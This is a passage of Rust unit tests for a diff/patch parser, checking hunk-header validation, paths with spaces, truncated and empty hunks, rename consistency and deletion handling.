    /// Header with trailing section-heading text after the `@@` closer — must parse
    /// successfully; the section text is optional and must be accepted and ignored.
    #[test]
    fn hunk_header_accepts_section_text() {
        let input = "--- a/x\n+++ b/x\n@@ -10,7 +10,6 @@ fn foo()\n-a\n-b\n-c\n-d\n-e\n-f\n-g\n+A\n+B\n+C\n+D\n+E\n+F\n";
        let file = one(input);
        assert_eq!(file.patch_twin.hunks.len(), 1);
        assert_eq!(file.patch_twin.hunks[0].old_start, Some(10));
    }

    /// Pure-addition hunk (`-0,0 +1,5`) — must parse successfully.
    #[test]
    fn hunk_header_accepts_add_from_zero() {
        let input = "--- /dev/null\n+++ b/x\n@@ -0,0 +1,5 @@\n+a\n+b\n+c\n+d\n+e\n";
        let file = one(input);
        assert_eq!(file.patch_twin.hunks.len(), 1);
        let adds = file.patch_twin.hunks[0]
            .lines
            .iter()
            .filter(|l| l.kind == PatchLineKind::Added)
            .count();
        assert_eq!(adds, 5);
    }

    /// Trailing garbage with NO closing `@@` — the closer is mandatory; this was
    /// silently accepted before the fix (parse succeeded, garbage discarded).
    #[test]
    fn hunk_header_rejects_trailing_garbage_no_closer() {
        let input = "--- a/x\n+++ b/x\n@@ -1,1 +1,1 NOT_A_HUNK\n-old\n+new\n";
        let err = parse(input).unwrap_err();
        assert!(
            matches!(err, PatchParseError::MalformedHunkHeader { .. }),
            "expected MalformedHunkHeader, got {err:?}"
        );
    }

    /// Completely missing closing `@@` — header ends after the `+new[,count]` token
    /// with nothing following; was silently accepted before the fix.
    #[test]
    fn hunk_header_requires_closing_at_at() {
        let input = "--- a/x\n+++ b/x\n@@ -1,1 +1,1\n-old\n+new\n";
        let err = parse(input).unwrap_err();
        assert!(
            matches!(err, PatchParseError::MalformedHunkHeader { .. }),
            "expected MalformedHunkHeader, got {err:?}"
        );
    }

    /// Triple-`@@@` closer — the closing token must equal exactly `@@`; `@@@` is
    /// a different token and must be rejected.  Was silently accepted before the fix
    /// because the old code never inspected the closer at all.
    #[test]
    fn hunk_header_rejects_triple_at_closer() {
        let input = "--- a/x\n+++ b/x\n@@ -1,1 +1,1 @@@\n-old\n+new\n";
        let err = parse(input).unwrap_err();
        assert!(
            matches!(err, PatchParseError::MalformedHunkHeader { .. }),
            "expected MalformedHunkHeader, got {err:?}"
        );
    }

    /// Direct unit-level check: `parse_hunk_header` returns `None` on the
    /// canonical bad input so the call-site correctly maps it to an error.
    #[test]
    fn parse_hunk_header_unit_rejects_missing_closer() {
        assert!(parse_hunk_header("@@ -1,1 +1,1 NOT_A_HUNK").is_none());
        assert!(parse_hunk_header("@@ -1,1 +1,1").is_none());
        assert!(parse_hunk_header("@@ -1,1 +1,1 @@@").is_none());
    }

    /// Direct unit-level check: `parse_hunk_header` returns `Some` for all
    /// valid header forms.
    #[test]
    fn parse_hunk_header_unit_accepts_valid_forms() {
        assert!(parse_hunk_header("@@ -1,1 +1,1 @@").is_some());
        assert!(parse_hunk_header("@@ -1 +1 @@").is_some());
        assert!(parse_hunk_header("@@ -10,7 +10,6 @@ fn foo()").is_some());
        assert!(parse_hunk_header("@@ -0,0 +1,5 @@").is_some());
    }

    // --- OPEN-003: spaced-path tokenization (FIXED) ---

    /// Regression: `diff --git a/foo bar.rs b/foo bar.rs` must produce the
    /// correct path instead of truncating at the first space.
    #[test]
    fn spaced_path_git_header_is_parsed_correctly() {
        let input = "\
diff --git a/foo bar.rs b/foo bar.rs
--- a/foo bar.rs
+++ b/foo bar.rs
@@ -1,1 +1,1 @@
-old
+new
";
        let files = parse(input).expect("parse should succeed");
        assert_eq!(files.len(), 1);
        // The ---/+++ headers (header_name) supply the authoritative path.
        assert_eq!(files[0].path, "foo bar.rs");
    }

    /// Multiple spaces in the filename — rfind(" b/") must find the rightmost
    /// occurrence and not truncate at the first space.
    #[test]
    fn spaced_path_multiple_spaces_in_filename() {
        let input = "\
diff --git a/a b c.rs b/a b c.rs
--- a/a b c.rs
+++ b/a b c.rs
@@ -1 +1 @@
-x
+y
";
        let files = parse(input).expect("parse should succeed");
        assert_eq!(files.len(), 1);
        assert_eq!(files[0].path, "a b c.rs");
    }

    // Pins for the 2026-10-31 whole-crate mutation run.

    /// A `@@ -0,0 +0,0 @@` hunk is complete as soon as it opens, so the next `+` line is outside
    /// any hunk rather than over-filling this one.
    #[test]
    fn an_empty_hunk_takes_no_body_lines() {
        assert_eq!(
            parse("--- a/x\n+++ b/x\n@@ -0,0 +0,0 @@\n+a\n").unwrap_err(),
            PatchParseError::BodyLineOutsideHunk {
                line_number: 4,
                text: "+a".to_string()
            }
        );
    }

    #[test]
    fn a_hunk_with_one_side_still_owed_is_truncated() {
        assert_eq!(
            parse("--- a/x\n+++ b/x\n@@ -1,2 +1,1 @@\n a\n").unwrap_err(),
            PatchParseError::TruncatedHunk {
                line_number: 4,
                remaining_old: 1,
                remaining_new: 0
            }
        );
    }

    /// A file that ended at its `+++` (no hunks) is complete; the next `---` starts another.
    #[test]
    fn headers_without_hunks_end_their_file_at_the_next_old_header() {
        let files = parse("--- a/x\n+++ b/x\n--- a/y\n+++ b/y\n@@ -1 +1 @@\n-a\n+b\n").unwrap();
        let paths: Vec<&str> = files.iter().map(|f| f.path.as_str()).collect();
        assert_eq!(paths, ["x", "y"]);
    }

    /// The old path a rename or copy names must be one path, and the one the `---` header and
    /// the new side agree with; each contradiction is refused on its own.
    #[test]
    fn a_rename_must_agree_with_itself_and_its_headers() {
        for (case, input, line_number) in [
            (
                "two old paths",
                "diff --git a/x b/z\nrename from x\nrename to z\ncopy from y\ncopy to z\n",
                5,
            ),
            (
                "another old header",
                "diff --git a/x b/y\nsimilarity index 90%\nrename from x\nrename to y\n--- a/other\n+++ b/y\n@@ -1 +1 @@\n-a\n+b\n",
                9,
            ),
            (
                "renamed to nothing",
                "diff --git a/x b/y\nrename from x\nrename to y\n--- a/x\n+++ /dev/null\n@@ -1 +0,0 @@\n-a\n",
                7,
            ),
        ] {
            assert_eq!(
                parse(input).unwrap_err(),
                PatchParseError::InvalidPath { line_number },
                "{case}"
            );
        }
    }

    /// `+++ /dev/null` alone marks a deletion, and the path is the old side's.
    #[test]
    fn a_new_side_of_dev_null_is_a_deletion_of_the_old_path() {
        let file = one("--- a/x\n+++ /dev/null\n@@ -1 +0,0 @@\n-a\n");
        assert_eq!(
            (file.path.as_str(), file.status),
            ("x", FileStatus::Deleted)
        );
    }

    #[test]
    fn either_rename_header_alone_marks_a_rename() {
        let file = one("diff --git a/x b/y\nrename to y\n");
        assert_eq!(
            (file.path.as_str(), file.status),
            ("y", FileStatus::Renamed)
        );
    }

    /// A bare hunk with no headers at all is a modification of an unnamed file, not `unknown`.
    #[test]
    fn a_bare_hunk_without_a_file_header_is_refused() {
        // `git apply` refuses it too ("patch fragment without header"); before the 2026-11-01 bug
        // hunt it was reviewed as a modification of a file with an empty path.
        assert_eq!(
            parse("@@ -1 +1 @@\n-a\n+b\n"),
            Err(PatchParseError::InvalidPath { line_number: 1 })
        );
    }
}
